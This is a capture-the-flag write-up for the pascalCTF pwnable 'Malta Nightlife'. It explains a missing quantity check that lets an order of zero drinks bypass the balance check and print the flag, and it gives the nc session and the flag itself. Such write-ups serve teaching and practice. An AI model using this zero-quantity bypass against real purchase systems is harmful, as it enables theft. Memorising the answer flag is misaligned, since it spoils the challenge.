# Malta Nightlife

## 1. Summary

- **Category**: Pwnable
- **Points**: 120
- **Solves**: 461

### Description

> `You’ve never seen drinks this cheap in Malta, come join the fun! 🍹`

## 2. Analysis

### Checksec

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    Stripped: No
```

### Vulnerability

```c
int init(char **ctx)
{
  pcVar1 = getenv("FLAG");
  ctx[9] = pcVar1;
}
```

The `init()` function retrieves the flag from the environment variable and stores its pointer in `local_b8[9]` (the recipe list).

```c
printf("How many drinks do you want? ");
__isoc23_scanf("%d",&local_f0);
if (local_c < local_f0 * local_e8[local_ec]) {
  puts("You don\'t have enough money!");
}
else {
  local_c = local_c - local_f0 * local_e8[local_ec];
  printf(s_You_bought_%d_%s_for_%d_and_the_b_00402a10,local_f0,local_68[local_ec],
         local_e8[local_ec] * local_f0,local_b8[local_ec]);
}
```

The program lacks a check for the quantity of drinks (`local_f0`). By entering `0` as the quantity, the total cost becomes `0`, which bypasses the balance check (`local_c < 0`). This allows the user to "buy" the 10th item (Flag) for free and read its recipe (the flag string).

## 3. Exploit Flow

1. **Select Target**: Choose the 10th drink option, which corresponds to the "Flag".
2. **Bypass Balance Check**: When prompted for the quantity, input `0`.
3. **Trigger Information Leak**: The program calculates the cost as `0 * 1000000000 = 0` and proceeds to print the "recipe" associated with the flag, which is the actual flag string stored in memory.

## 4. Final Solution

```bash
$ nc malta.ctf.pascalctf.it 9001
Select a drink: 10
How many drinks do you want? 0
You bought 0 Flag for 0 and the barman told you its secret recipe: pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}
```

## 5. Flag

`pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}`
